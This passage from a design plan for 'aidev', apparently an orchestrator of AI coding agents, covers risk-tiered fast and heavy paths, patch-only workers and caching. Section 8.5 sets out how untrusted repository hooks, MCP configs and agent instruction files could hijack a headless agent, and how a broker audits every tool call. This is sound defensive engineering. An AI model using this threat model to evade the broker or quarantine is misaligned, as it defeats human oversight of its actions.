This is where most tasks live and where aidev must win. It is deliberately a **minimal linear FSM**,
not the full assurance FSM that R2/R3 use.

### 4.1 Pipeline

```text
  task text
     │
  ┌──▼──────────────────────────────────────────────┐
  │ PHASE 0 · DETERMINISTIC PREPARE   (no model)    │
  │   worktree from HEAD + LOGICAL config quarantine │
  │   localize: import graph + symbol closure        │
  │             + git co-change + path rules         │
  │   classify: R-tier from static scorer            │
  │   select:   impacted tests (TIA)                 │
  │   assemble: ≤10 files, symbol closure            │
  │   assert:   closure predicate holds (P-08)       │
  │   warm:     type daemon, test runner             │
  │   prewarm provider process in NEUTRAL cwd only   │
  └──┬──────────────────────────────────────────────┘
     │  escalate to heavy path if class ≥ R2
     │
  ┌──▼──────────────────────────────────────────────┐
  │ PHASE 1 · IMPLEMENT     (1 model call)          │
  │   mode      ▸ PATCH_ONLY — ZERO model tools      │
  │   cwd       ▸ aidev-owned neutral scratch        │
  │   invariant ▸ policy + tool schema + approved    │
  │               project invariants                 │
  │   variable  ▸ task + closure context             │
  │   output    ▸ HASH-GUARDED structured patch      │
  │               + rationale + touched symbols      │
  │   effort    ▸ R0 minimal / R1 low                │
  └──┬──────────────────────────────────────────────┘
     │  aidev verifies expected base hashes, applies
     │  via Broker fs.write — never fuzzy-applies
     │
  ┌──▼──────────────────────────────────────────────┐
  │ PHASE 2 · POST-DIFF ASSESSMENT   (no model)     │
  │   apply patch to the worktree                    │
  │   AGGREGATE diff against the ORIGINAL base       │
  │   actual changed files / symbols / AST delta     │
  │   recompute: risk vector, TIA set, closure,      │
  │              context gap, diff-size ceiling      │
  │   if class promoted ≥ R2 → restore pre-IMPLEMENT │
  │      checkpoint; carry the patch forward as       │
  │      EVIDENCE ONLY, not as the starting state     │
  └──┬──────────────────────────────────────────────┘
     │
  ┌──▼──────────────────────────────────────────────┐
  │ PHASE 3 · VERIFY        (no model)              │
  │   1. parse / compile                             │
  │   2. warm type-check on changed files            │
  │   3. impacted tests (recomputed set), fail-fast  │
  │   4. secret scan on diff                         │
  │   ‖ lint / SAST in parallel                      │
  └──┬──────────────────────────────────────────────┘
     │
     ├── pass ──────────────────────────► READY
     │
     └── fail ──► PHASE 4 · REPAIR  (1 model call, ~30% of tasks)
                    same invariant block + failure evidence
                    effort +1 level · tool-less · hash-guarded
                    │
                    └──────► back to PHASE 2 · POSTDIFF
                                │
                                ├─ promoted / gap / too large ─► ESCALATED
                                └─ still R0/R1 ─► VERIFY
                                                   ├─ pass ─► READY
                                                   └─ fail ─► ESCALATED
```

**Model calls: 1 typical, 2 with repair, 3 worst case when the temporary ambiguous-band tie-break is
also needed.** Everything else is deterministic. **A repair never bypasses post-diff assessment**
(P-28, I-19).

The post-diff assessment is what makes the fast path safe to be this short. Preflight decides
*whether to try cheaply*; post-diff decides *whether the attempt stayed cheap*. Because the same
check runs after repair over the **aggregate** diff, a repair that wanders into auth, a migration, a
new dependency, or four extra files cannot reach `READY` by the back door.

### 4.2 What the fast path deliberately omits

| Omitted | Why |
|---|---|
| DISCOVER as a model call | Static localization is competitive at zero tokens (P-06) |
| CLASSIFY as a normal model call | Deterministic scorer; escalation-only tie-break in the ambiguous preflight band until E-03 (P-06) |
| DESIGN | Implicit for a single-module change; folded into the implement prompt |
| Independent test plan | Existing impacted tests already encode the repo's invariants |
| Mandatory review | Net-negative on small diffs (P-14) |
| Agentic exploration loop | Replaced by pre-assembled closure context (P-05) |
| **All fast-path model tools** | The context packet is closure-complete; the implementer is tool-less and runs from a neutral cwd (P-29) |
| MCP servers | Token cost and prefix invalidation (P-16) |
| Full test suite | Impacted selection (P-09) |

### 4.3 Escalation out of the fast path

The fast path exits to the heavy path or to a human when any of:

- Static classifier returns ≥ R2, or lands in the ambiguous mid-band and the tie-break model call
  returns ≥ R2.
- A floor marked `force_heavy` fires (auth, crypto, migration, payment, infra). A floor that only
  raises a dimension to `elevated` — a new dependency, a public-API **touch** — does **not** by itself
  eject the task, because the derivation already permits `elevated` at R1. Floors carry both a
  `risk_floor` and a `force_heavy` flag; only the latter forces the heavy path (§7.5).
  Note the distinction v5.0 blurred: changing an implementation *behind* an unchanged exported
  contract is a touch and stays R1-eligible; changing the **contract itself** — signature, schema,
  route, compatibility — is `F-PUBLIC-CONTRACT-CHANGE`, carries `force_heavy`, and leaves.
- The closure predicate cannot be satisfied within the 10-file ceiling.
- Repair fails after one attempt.
- The produced diff exceeds the ~400 LOC ceiling (P-15).
- Localizer confidence is below threshold (no single dominant candidate set).

Escalation is cheap: the worktree, context, and evidence already exist and carry forward.

### 4.4 Budget models (hypotheses until E-01/E-02)

**Tokens, R1, warm cache, Sonnet-class:**

| Item | Solo agent | aidev fast path |
|---|---|---|
| Fixed prefix | ~14k once, then cache-read across ~12 turns | ~14k once (cache-write), cache-read thereafter |
| Exploration / file reads | ~40% of total; much re-read | 0 — pre-assembled |
| History re-sent per turn | grows to ~80–100k by turn 12 | none; ≤3 calls |
| Task context | scattered across turns | ~8k, closure-bounded, once |
| Reasoning | ~1.7× output per turn × 12 | 1–2 calls at low effort |
| Output | diff | diff |
| **Billable input** | large but ~98% cache-read | small and ~80–90% cache-read |
| **Net** | baseline | **≈0.7–0.9×** |

0.5× is unreachable because the solo session's large history is already heavily discounted. The win
comes from *eliminating turns*, not from out-caching a cache.

**Latency, R1:**

| Segment | Solo agent | aidev fast path |
|---|---|---|
| Startup | ~2–4s once | ~2–4s once (warm pool amortises across tasks) |
| Model round-trips | ~12 × 2–4s = 24–48s | 1–2 × 3–5s = 3–10s |
| Tool execution | many small calls | none (pre-assembled) |
| Type check | cold, ~30s if run at all | warm, ~3s |
| Tests | full suite | impacted only, 2–8× less |
| **Net** | baseline | **≈1.2–1.6× faster** |

**At R0 specifically**, 2× is reachable *only* if per-stage process spawning is eliminated. With
process-per-stage, aidev is slower than solo at R0 — startup tax exceeds the trivial edit's
inference time. This is the single most important implementation constraint in the document.

---

## 5. The heavy path (R2/R3)

Unchanged in shape from v1.0. The full FSM earns its cost here.

```text
DISCOVER → CLASSIFY → DESIGN → CHALLENGE → IMPLEMENT → VERIFY → REVIEW → READY
                                                │          │        │
                                                └── repair ─┴────────┘
```

| Class | Path |
|---|---|
| R2 | Discover → risk → architecture → independent challenge → test plan → implement → full verification → strong review + specialist for the triggered dimension → fixes → re-verify |
| R3 | + red-team the design, explicit invariant/oracle tests, specialist review, independent second-model confirmation of BLOCKER/HIGH, human gate for external effects |
| Hard bug | Evidence packet → two independent read-only diagnoses → experiments → root-cause adjudication → failing regression test → minimal fix → verify → review |
| Migration | Data invariants → design → rollback plan → dry-run → implement → representative-data verification → integrity checks → human production gate |
| Security-sensitive | Threat model → architecture review → constrained implementation → security tests + SAST → specialist independent review → human gate |

Heavy path keeps: fresh reviewer context, provider diversity preference, independent test plans,
adjudication before fixes, mandatory human gates. It does **not** get the fast path's shortcuts.

Cache discipline still applies: the heavy path uses one invariant block per *stage group* and forks
rather than re-spawns. Where a provider offers a longer cache TTL, aidev enables it only when the
**measured** p90 inter-call gap for that project exceeds the **measured** default TTL and the
write-premium economics justify it (S-04). No TTL number is hardcoded in this plan.

---

## 6. Architecture

### 6.1 Component map

```text
     aidev CLI / TUI ──── Unix socket (0600) ────► aidevd  (sole DB writer)
                                                      │
    ┌─────────────────────────────────────────────────┼───────────────────────────┐
    │ DETERMINISTIC CORE                              │                           │
    │   Router (fast|heavy)   FSM   Policy   Workspace   Checkpoints              │
    └─────────────────────────────────────────────────┼───────────────────────────┘
                                                      │
    ┌─────────────────────────────────────────────────┼───────────────────────────┐
    │ STATIC ANALYSIS CORE          (zero model calls)                            │
    │   Localizer · Classifier · Closure Predicate · TIA · Co-change · Floors     │
    └─────────────────────────────────────────────────┼───────────────────────────┘
                                                      │
                                          Context Assembler
                                  (closure-bounded, trust-labelled)
                                       ▲
                          TRUST ROOT ───┘   approved hashes gate what may instruct
                                                      │
                                     Invariant Block + Session Pool
                            (byte-stable block, fork, provider cache strategy)
                                                      │
                          ┌───────────────────────────┴──────────────────┐
                          ▼                                              ▼
                  ClaudeWorker (SDK/CLI)                        CodexWorker (SDK/CLI)
                  PATCH_ONLY: zero tools               BROKERED_TOOLS: every request
                  neutral cwd                          intercepted before effect
                          └───────────────────────────┬──────────────────┘
                                                      ▼
                                          Patch Applier (hash-guarded)
                                                      ▼
                                               ACTION BROKER
                          policy · trust · path canon · arg validation
                          env filter · egress split · human gate
                                    ▼                        ▼
                             ACTION JOURNAL           Sandbox (provider-native)
                        durable id · reconciliation            ▼
                                        Run worktree · Git · provisioned env
                                                      ▼
                    Verification Engine  (warm type daemon, TIA runner, fail-fast)
                                                      ▼
                              Findings → conditional review → adjudication
                                                      ▼
                                          Human gate (if required)
                                                      ▼
                                                    READY
```

### 6.2 Module layout

```text
src/aidev/
├── cli/                typer commands, socket client
├── tui/                textual app (M8)
├── daemon/             fastapi on UDS, lifespan, single-writer guard
├── core/
│   ├── router.py             fast vs heavy path selection
│   ├── fastpath.py           the ≤3-call pipeline
│   ├── fsm.py                heavy-path states, transitions, guards
│   ├── checkpoint.py         transactional stage commit + resume
│   └── ids.py
├── models/             pydantic contracts
├── store/              db, migrations, events, content-addressed artifacts
├── static/             ★ the deterministic core — zero model calls
│   ├── localize.py           import graph + symbol closure + co-change
│   ├── preflight.py          PreflightFacts + provisional tier (P-19)
│   ├── postdiff.py           PostDiffFacts + authoritative tier (P-19)
│   ├── closure.py            the sufficiency predicate (P-08)
│   ├── impact.py             test impact analysis, computed twice
│   ├── cochange.py           git co-change model, retrained bi-monthly
│   └── floors.py             risk_floor / force_heavy detectors
├── risk/               vector assembly, derivation, recompute hooks
├── policy/             invariants.py (frozen), loader.py, evaluate.py
├── broker/             verbs, decisions, env, paths, egress split, gates
├── journal/            ★ action states, durable action_id, per-verb reconciliation (P-23/P-35)
├── trust/              ★ local trust root, hash approval, proposal diffing (P-22)
├── env/                ★ EnvKey fingerprint, provision, atomic publish, leases (P-26/P-31)
├── patch/              ★ hash-guarded structured patch contract + applier (P-34)
├── sandbox/            backend interface + provider-native
├── workspace/          worktrees, dirty policy, logical quarantine, checkpoints, gc
├── workers/
│   ├── modes.py              ★ PATCH_ONLY / BROKERED_TOOLS tool-surface contract (P-20/P-29)
│   ├── pool.py               warm session pool, lifecycle, TTL watchdog, neutral pre-warm
│   ├── prefix.py             invariant-block builder + hash assertion
│   ├── session.py            session handle, fork, resume
│   ├── base.py               WorkerAdapter protocol
│   ├── claude.py             SDK-first, CLI fallback
│   ├── codex.py              app-server-first, exec fallback
│   ├── fake.py               deterministic fake worker
│   └── registry.py           model registry loader
├── context/            assembler, providers, trust labelling, packet hashing
├── memory/             markdown store, promotion, FTS index
├── verify/
│   ├── daemon.py             ★ warm type-checker lifecycle
│   ├── plan.py               fail-fast ordering, risk matrix
│   └── adapters/             python, node, generic, gitleaks, osv, semgrep
├── review/             conditional trigger, packet builder, findings, adjudication
├── telemetry/          ★ token/latency accounting from M0, cache health, redaction
├── eval/               corpus, runner, paired statistics
└── config/
```

### 6.3 On-disk layout

```text
~/.aidev/
├── config.toml · models.toml · policy.yaml
├── aidev.db                    SQLite WAL
├── aidev.sock                  0600
├── prefixes/<hash>.txt         materialised invariant blocks, for hash verification
├── artifacts/sha256/aa/bb/<hash>
├── envs/<project-id>/
│   ├── .tmp/<provision-id>/    writable while provisioning
│   └── <env-key>/              immutable after atomic publish (P-31)
├── cochange/<project-id>.model retrained bi-monthly
├── neutral-cwd/                aidev-owned; provider pre-warm only (P-36)
├── logs/aidevd.jsonl
└── workspaces/<project-id>/run-<id>/
    ├── primary/                 run worktree — never contains quarantine deletions
    ├── scratch/                 TMPDIR, worktree-local build caches
    ├── sanitized-view/          optional, provider-specific; never in the user diff
    ├── quarantine-manifest.json inventory + hashes of masked agent config
    └── evidence/                verification output

<project>/.aidev/               ← ALL of this is a PROPOSAL until hash-approved (P-22)
├── project.toml · policy.yaml
└── memory/*.md                 canonical knowledge, committed to git
```

Trust root and action journal live in `aidev.db` (`trusted_content`, `action_journal`) — daemon
owned, never in a repository.

---

## 7. Static analysis core (deterministic)

This module is the source of aidev's advantage: everything it answers is an answer nobody pays
tokens for. **Everything inside the core is model-free.** It emits the preflight score and its
ambiguity margin; the router may invoke the escalation-only ambiguous-band tie-break described in
§7.3 until E-03 retires it (I-12). Build the core early (M3) and well.

### 7.1 Localizer

Produces a ranked candidate set, capped at **10 files** (P-07).

| Signal | Cost | Use |
|---|---|---|
| Exact symbol / identifier match from the task text | free | seed |
| Import-graph reachability from seed symbols | free | primary expansion |
| Call-graph proximity (LSP, warm) | cheap | callers and callees of the edit site |
| Git co-change coupling | cheap, retrained bi-monthly | files that historically change together |
| Test-to-source mapping (from TIA) | cheap | the tests that cover the seed |
| Path rules (config, migrations, security dirs) | free | floor triggers |
| Full-text / ripgrep fallback | cheap | when symbol resolution fails |

Ranking is a weighted score; weights start as defaults and are tuned only after E-03. Do **not**
over-slice: file-level plus symbol closure, never line-level ranges handed to the model (P-07).

### 7.2 Closure predicate (P-08)

The v1.0 "evidence coverage" placeholder is replaced by a computable gate:

```python
def closure_complete(ctx: AssembledContext, target: EditSite, tests: ImpactedTests) -> bool:
    unresolved = resolve_free_identifiers(target, ctx)      # pyright / ts-morph
    test_imports = transitive_imports(tests)
    return (
        len(unresolved) == 0
        and test_imports.issubset(ctx.modules)
        and len(ctx.files) <= MAX_FILES              # 10
    )
```

Expansion loop is deterministic: while the predicate fails and the file budget allows, add the
highest-ranked unresolved symbol's defining file. If the budget is exhausted before the predicate
holds, **escalate to the heavy path** — do not proceed with insufficient context.

This is the recall floor; the 10-file cap is the precision ceiling. The cost curve is U-shaped:
under-inclusion causes repair loops, over-inclusion causes silently wrong patches.

### 7.3 Two-phase assessment (P-19, I-16)

v2.0's classifier consumed facts that do not exist before a patch does. v3.0 splits it. The two
assessments have **different input types**, enforced by the type system rather than by discipline:

```python
class PreflightFacts(BaseModel):      # everything knowable before IMPLEMENT
    task_text: str
    candidate_files: list[Path]       # from the localizer, ≤10
    candidate_symbols: list[Symbol]
    predicted_fan_out: int            # import-graph out-degree of candidates
    cochange_coupling: float
    path_rule_hits: list[FloorHit]    # auth/migration/payment/infra paths in candidates
    test_coverage_exists: bool
    historical_similar_class: str | None

class PostDiffFacts(BaseModel):       # only after a patch exists
    changed_files: list[Path]
    changed_symbols: list[Symbol]
    ast_delta: AstDelta               # comment/string-only? signature change? control flow?
    added_lines: int; removed_lines: int
    dependency_manifest_changed: bool
    actual_fan_out: int
    context_gap: list[Symbol]         # symbols in the diff that were absent from context
```

**Preflight classification** (before IMPLEMENT) — a *provisional* tier used only to choose a path
and an effort level:

```text
R0-provisional  1 candidate file, no fan-out, no path-rule hit, tests exist
R1-provisional  ≤3 candidates, single module, fan-out under threshold, no force_heavy floor
≥R2             cross-module candidates, public CONTRACT change, elevated fan-out, force_heavy floor
```

**Post-diff classification** (after the patch, before verification) — **authoritative**:

```text
R0  AST delta is comment/string-only or provably behaviour-preserving, 1 file
R1  ≤3 files, single module, no manifest change, actual fan-out under threshold
R2  cross-module, public CONTRACT change, elevated actual fan-out, or one floor at high
R3  any floor at critical, or ≥2 dimensions at high
```

**Promotion handling.** If post-diff promotes the class above the path that produced it:

1. Emit `risk.escalated` with the full assessment chain — every preflight and postdiff ordinal — and
   the delta that caused promotion. **No assessment is ever overwritten** (P-38, I-24); a repaired
   run keeps `postdiff#1` alongside `postdiff#2`, which is the only way to answer later why the
   first patch was R1 and the repair was not.
2. **Call `rollback_to_checkpoint(pre_implement_cp)`** (§12.4) — the same primitive crash recovery
   uses, so the generation is incremented and workspace-local attempts above the checkpoint's
   watermark are voided. Promotion is a rollback; it must not have its own implementation.
3. Carry the rejected patch forward as an `ArtifactEnvelope(kind=ChangeSet, status=evidence_only)`.
   It is context for the heavy path, never its starting state — a patch produced under R1
   assumptions has not earned the right to be the baseline for R3 work.
4. Re-enter the heavy path at `CLASSIFY` with the localization and context already computed.

Ambiguous mid-band (between R1 and R2 by the preflight scorer's own margin) is the **only** place a
classification model call is permitted, and it may only escalate. Post-diff classification is
always model-free.

**Classifier acceptance criteria are directional and normative per P-40, E-03, and M3.** Post-diff
gates on R2+ recall, R3 recall, and a bounded underclassification rate; preflight is gated more
loosely because post-diff catches its false negatives. **Overall accuracy is diagnostic only** — a
95%-accurate post-diff classifier whose every error is *actual R2 → predicted R1* is a safety
failure, and v5.1's "must exceed 95%" would have passed it.

### 7.4 Test impact analysis (P-09)

| Ecosystem | Mechanism | Fail-safe |
|---|---|---|
| Python | import-graph (`pytest-impacted` / `tach`-style module graph); optional coverage map | Full suite |
| Node/TS | `jest --findRelatedTests` / vitest related | Full suite |
| Generic | commands declared in `project.toml` (locally approved, P-22) | Always full suite |

**One fail-safe semantic: run the full suite.** There is no intermediate "impacted-module suite"
fallback — a stale map is exactly the situation in which module boundaries cannot be trusted.

**Fail-safe triggers:** lockfile or manifest changed · config/build files changed · coverage or
import map older than the threshold · a `force_heavy` floor fired · class ≥ R2 · post-diff changed
files ⊄ preflight candidates.

**TIA is computed twice.** Preflight selection warms the runner and pre-loads fixtures speculatively
while the model call is in flight. **The authoritative selection is recomputed from the actual
diff** (P-19); if the model edited a file the localizer never proposed, the preflight selection is
discarded, not patched up. The cardinal sin is skipping a test that would have failed; bias toward
over-selection everywhere.

### 7.5 Risk floors (unchanged from v1.0, still deterministic)

| Rule | Trigger | `risk_floor` | `force_heavy` |
|---|---|---|:--:|
| `F-AUTH` | auth/session/token/permission/role/acl paths or symbols | `security ≥ critical` | ✓ |
| `F-CRYPTO` | crypto primitives, key handling, signing | `security ≥ critical` | ✓ |
| `F-MIGRATION-DESTRUCTIVE` | drop/truncate/alter-column-type | `irreversibility ≥ critical`, `data_integrity ≥ high` | ✓ |
| `F-MIGRATION` | any schema migration | `irreversibility ≥ high` | ✓ |
| `F-PAYMENT` | payment/charge/refund/billing | `external_side_effect ≥ critical` | ✓ |
| `F-EXTERNAL-SEND` | mail, SMS, push, webhook | `external_side_effect ≥ high` | ✓ |
| `F-INFRA` | IaC, CI, Dockerfile, deploy manifests | `operational ≥ high` | ✓ |
| `F-CONCURRENCY` | threading/async/locks/queues | `complexity ≥ high` | ✓ |
| `F-DEP-MAJOR` | major version bump | `supply_chain ≥ high` | ✓ |
| `F-NEW-DEP` | new manifest/lockfile entry | `supply_chain ≥ elevated` | — |
| `F-PUBLIC-API-TOUCH` | implementation changed behind an unchanged exported contract | `blast_radius ≥ elevated` | — |
| `F-PUBLIC-CONTRACT-CHANGE` | exported signature, schema, route contract, or backwards-compatibility change | `blast_radius ≥ high` | ✓ |
| `F-NO-TESTS` | touched module has no discoverable tests | `testability ≥ high` | — |
| `F-UNKNOWN-STACK` | no verification adapter for the language | `novelty ≥ high` | — |
| `F-BLAST-N` | > N files / M modules (configurable) | `blast_radius ≥ elevated` | — |

`risk_floor` raises a dimension. `force_heavy` ejects the task from the fast path regardless of the
derived class. They are separate because an `elevated` dimension is legitimately R1 territory — a
new dependency should not force architecture review, but it must still raise supply-chain risk and
trigger a dependency scan.

Each floor hit records matching evidence (path, line, symbol). A model may raise; nothing may lower
(I-05). Floors run in **both** assessments: preflight over candidate paths, post-diff over actual
changed paths.

### 7.6 Derivation

```python
def derive_class(v: RiskVector, policy: Policy) -> str:
    if any(l == CRITICAL for l in v.values.values()):        return "R3"
    if sum(l >= HIGH for l in v.values.values()) >= 2:       return "R3"
    if any(l == HIGH for l in v.values.values()):            return "R2"
    if sum(l >= ELEVATED for l in v.values.values()) >= 2:   return "R2"
    if any(l >= ELEVATED for l in v.values.values()):        return "R1"
    if static_score(v) >= R1_THRESHOLD:                      return "R1"
    return "R0"
```

No averaging. Thresholds live in `policy.yaml` with tighten-only semantics.

---

## 8. Worker runtime

### 8.1 Cache model: three concepts, not one (P-21)

v2.0 collapsed three independent things into a single one-breakpoint abstraction. They have
different lifetimes, different owners, and different metrics:

| Concept | Lifetime | Owner | Metric | Failure mode |
|---|---|---|---|---|
| `process_warm` | Daemon session | Session pool | Startup ms avoided per task | Version change, idle eviction, crash |
| `project_prefix_cached` | Project config version | Prefix manager | Cache-read tokens on the invariant block | Memory promotion, tool-list change, policy edit |
| `task_context_cached` | One task, provider TTL | Adapter | Cache-read ratio across calls 2..N | TTL expiry during a long test run |

Each adapter implements its own strategy for the latter two. **The plan does not mandate one
breakpoint at one position** — some providers extend the cached prefix automatically as the
conversation grows, and hard-coding a single breakpoint would forgo that. What the plan mandates is
the *invariant* (I-11) and the *measurement*.

The reference layout below is a **default, not a mandate** (P-03). An adapter may place additional
breakpoints or rely on automatic prefix extension, provided the invariant block stays byte-stable
for its version and all three concepts remain separately measurable:

```text
[ tool schema — locked at session start, never mutated ]
[ aidev system policy — static ]
[ project invariants from canonical memory — static per project version ]
──────────────────────── CACHE BREAKPOINT ────────────────────────
[ task text ]
[ closure context ]
[ prior failure evidence, on repair ]
```

Rules enforced by code, not convention:

- No timestamps, UUIDs, run ids, or counters in the invariant block.
- Tool list is frozen at session creation; dynamic registration is forbidden (it invalidates
  everything).
- The invariant block is hashed and stored; every subsequent call asserts the hash matches, and a
  mismatch is a hard error, not a warning (I-11).
- Project invariants enter the prefix **only after passing the trust root** (P-22, §15). An
  unapproved repo memory edit cannot silently change what the model is instructed to believe.
- TTL watchdog, expressed in **measured variables, never provider constants**. S-04 populates
  `adapter.measured_default_ttl`, `adapter.measured_extended_ttl`, and
  `adapter.measured_write_premium` per provider; the plan states no numeric cache assumption:

  ```text
  if project.gap_p90 > adapter.measured_default_ttl:
      if adapter.measured_extended_ttl exists
         and expected_reuse × read_saving > measured_write_premium × block_tokens:
          enable extended TTL
      else:
          accept the re-write and record it as cache_creation
  ```

  The decision comes from the measured p90 inter-call gap for that project — which grows with test
  suite runtime — not from a guessed number.

### 8.2 Session pool (P-02)

```python
class SessionPool:
    async def acquire(self, project: ProjectId, role: Role) -> Session: ...
    async def fork(self, session: Session, role: Role) -> Session: ...   # review, second opinion
    async def release(self, session: Session) -> None: ...
    async def evict_expired(self) -> None: ...                            # TTL + idle policy
```

- One session per task, forked for review or second opinion so the cached prefix is shared and only
  the appended content differs.
- Provider processes may be pre-warmed on daemon start **only in an aidev-owned neutral cwd with no
  repository attached** (P-36). A project-bound session opens only after the worktree exists, repo
  agent config is logically quarantined, and the trust root has been resolved. This keeps the
  startup saving without giving untrusted repo config an early execution window.
- Prefer in-process SDK over shelling out per call. Where a CLI is used, prefer its persistent
  server mode (Codex exposes one; Claude Code does not document one — see S-01).
- Every session records `cli_version` / `sdk_version`; a version change invalidates the pool.

### 8.3 Execution modes (P-20, P-29) — the Broker and read boundaries, made real

v2.0 claimed every worker side effect crosses the Action Broker, while also configuring Codex with
workspace-write and approvals disabled. Both cannot be true: a worker that runs its own shell inside
its own sandbox performs actions aidev never saw. v3.0 resolves this with two explicit modes.

```python
class ExecutionMode(str, Enum):
    PATCH_ONLY      = "patch_only"       # no mutation tools; returns a structured patch
    BROKERED_TOOLS  = "brokered_tools"   # tool requests interceptable before execution
```

**`PATCH_ONLY` — the fast-path default, and the only mode a provider gets for free.**
The model-visible tool schema is **empty**: no read, grep, glob, write, exec, network, MCP, or secret
tools (P-29, I-18). The provider process runs from an aidev-owned neutral cwd, not the worktree. The
task and closure-bounded source arrive in the prompt; the worker returns a structured patch under a
schema (P-05). **aidev applies it**, through Broker `fs.write`/`fs.delete` verbs with full path
canonicalisation.

The Broker boundary is trivially real here because the worker never held the capability. v3.0 left
read tools in place; that was unnecessary authority over unrelated local files, and the context
packet is closure-complete by construction — there is nothing for a read tool to find.

This is not a compromise for the fast path. It is the *natural* shape of one constrained-schema call
with pre-assembled context.

**`BROKERED_TOOLS` — heavy path only, and only where interception is proven.**
Every model-visible tool request — **including filesystem reads** — must reach aidev *before*
execution, and aidev's decision must be able to deny it. Read roots are declared and canonicalised
exactly like write roots. Acceptable mechanisms, in preference order:

1. A provider permission/approval callback that runs in aidev's process and gates each call.
2. A pre-tool-use hook owned by aidev (not by the repo) that can block with a non-zero exit.
3. A persistent server protocol where the client answers approval requests per call.

**If a provider cannot demonstrate mechanism 1, 2, or 3 under S-07, that provider is restricted to
`PATCH_ONLY` or read-only roles. No exceptions, and no "the sandbox is the boundary" fallback** —
a sandbox bounds *damage*, it does not produce the per-action audit record that D-19 and the
Definition of Done promise.

| Role | Mode | Rationale |
|---|---|---|
| Fast-path implementer | `PATCH_ONLY`, tool-less, neutral cwd | Closure-complete context; a patch is the only output with side-effect intent |
| Architect / reviewer / diagnostician | `BROKERED_TOOLS` with a **read-only root profile** if S-07 proves interception; else `PATCH_ONLY` with richer precompiled context | Exploration may want reads, but every read is scoped and audited |
| Heavy-path implementer | `BROKERED_TOOLS` if proven, else `PATCH_ONLY` | Iterative tools help only when the audit boundary is real |
| Verification | Not a worker | aidev runs checks directly; no model involved |

**Structured patch contract (P-34, I-20).** Each operation is `modify | create | delete | rename`
and carries the target path, `expected_base_blob_sha` (or explicit non-existence for `create`), the
edit payload, and `expected_result_sha`. aidev canonicalises the path and verifies base identity
before applying. A mismatch **never fuzzy-applies** on the fast path: it triggers deterministic
re-localization where safe, escalation otherwise. Result hashes are verified before POSTDIFF.

Provider-native sandboxing remains enabled underneath both modes as defence in depth. It is a
second layer, never the primary boundary.

### 8.4 Adapters

Interface unchanged from v1.0 (`probe`, `invoke`, `cancel`, `WorkerCapabilities`), with additions:

```python
class WorkerAdapter(Protocol):
    async def probe(self) -> WorkerCapabilities: ...
    async def open_session(self, prefix: CachedPrefix, policy: ExecutionPolicy) -> Session: ...
    async def call(self, session: Session, payload: CallPayload,
                   schema: JsonSchema | None) -> AsyncIterator[WorkerEvent]: ...
    async def fork(self, session: Session) -> Session: ...
    async def cancel(self, session: Session, *, graceful: bool = True) -> None: ...
```

**Claude worker.** In `PATCH_ONLY`, **every** model-visible tool is denied by bare-name rule — which
removes it from the model's context entirely — and the process launches from neutral aidev scratch;
the structured patch is returned under schema. In `BROKERED_TOOLS`, aidev supplies its own pre-tool-use gate — never one sourced from the
repository — and denies by default. Structured path uses JSON output with a JSON-schema constraint,
reading the structured output field. Streaming path uses stream-JSON with the verbose flag, adding partial
messages only when a live UI needs deltas — it costs event volume for no quality gain in headless
runs. Session continuation by captured session id. Permission posture is deny-unless-preapproved.
Cancellation sends SIGINT first (ends the turn cleanly), then SIGTERM (leaves the turn unfinished,
exit 143), then SIGKILL. Rate-limit retry events feed quota pressure. Never use permission-bypass
flags.

**Codex worker.** Non-interactive exec with JSONL events; structured output via output-schema.
In `PATCH_ONLY` all model-visible tools are disabled by config override and the process runs from
neutral aidev scratch; aidev applies the returned hash-guarded patch. In `BROKERED_TOOLS`, aidev
drives the persistent server protocol and answers each approval request through the Broker;
approvals are **not** set to never in this mode, because the approval channel *is* the mediation
channel. Config hygiene flags on every invocation. Reasoning effort per tier (P-12). Never emit the
removed full-auto flag, and never `danger-full-access`.

### 8.5 Untrusted-repository hardening (I-10, extended)

In a headless session there is no workspace-trust dialog. Repository-supplied hooks, settings `env`
blocks, helper commands, and MCP servers execute or connect by default. aidev closes this on every
invocation:

| Threat | Claude | Codex |
|---|---|---|
| Project hooks execute | restrict setting sources to user scope **and** disable all hooks via explicit settings | ignore project rules |
| Project MCP config auto-connects | strict MCP config with an aidev-managed file (empty on the fast path, P-16) | ignore user config; explicit MCP config |
| Project settings grant tools | user-scope setting sources; aidev's deny rules win at every scope | sandbox + approvals never |
| Repo-supplied skills/subagents | excluded by user-scope setting sources | ignore rules |

Plus **logical quarantine** (P-36): before any project-bound worker starts, `.claude/`, `.mcp.json`,
`.codex/`, `AGENTS.md`, and `CLAUDE.md` are inventoried, hashed, recorded, and excluded from provider
configuration and instruction loading. They are **not physically removed from the primary worktree** —
v3.0 moved them, which manufactured deletions that then polluted the user-visible diff, POSTDIFF
facts, TIA, and diff-size accounting. Where a provider cannot be made to ignore them, aidev builds a
separate sanitized worker view whose masking never reaches the primary worktree. The originals remain
available only as repository-trust **data** when the assembler explicitly includes them.

**In v1 there is no opt-back-in. The rule is absolute** (I-10, P-41):

```text
Repo-native Claude/Codex configuration
    MAY be inventoried and hashed
    MAY be shown to the user as data
    MAY enter context as repository-trust evidence
    NEVER executes
    NEVER registers a tool, MCP server, hook, skill, or subagent
```

v5.1 allowed quarantined files back in after hash approval, which contradicted I-10's "never
executes" and the Definition of Done. An absolute invariant with an approval escape hatch is not an
invariant. aidev already has its own trust-rooted project config and its own Broker; it has no need
to execute another agent's repository configuration, and removing the path removes a whole branch of
the threat model rather than guarding it. The `agent_config_files` opt-in is deleted from
`project.toml`; see Appendix B for the revival trigger.

**`.aidev/` is not exempt from the trust root** (P-22). v2.0 quarantined every other tool's config
and trusted its own, which is exactly backwards: aidev's project config declares executable
verification commands. Repo `.aidev/project.toml` and `.aidev/memory/*.md` pass through the trust
root (§15) before any of their content is executed or placed in an instruction position. That is a
*different* mechanism from quarantine: aidev's own config can be approved by content hash, because
aidev owns its semantics; another agent's config cannot, because executing it would hand a
repository the tool surface the Broker exists to own.

Note the tension: the strongest isolation switch (bare mode) disables subscription login and
requires an API key. Since v1 is subscription-first, aidev uses the flag combination above and
documents bare mode as correct for API-key operation.

### 8.6 Effort and escalation (P-12, P-13)

```text
R0  → cheapest capable tier, minimal effort
R1  → cheap tier, low effort
repair after verify failure → +1 effort level, same session, failure evidence appended
second failure → escalate to heavy path or human
```

**Model/effort cascade escalation after an attempt** triggers on the deterministic test oracle only —
never on model self-reported confidence, which is poorly calibrated. Because the trigger is the test
suite, false escalation is near zero and the wasted-first-attempt cost is bounded.

**Path escalation** (fast → heavy) is a separate mechanism with its own deterministic triggers: risk
promotion at POSTDIFF, a `force_heavy` floor, closure failure, non-empty context gap, diff-size
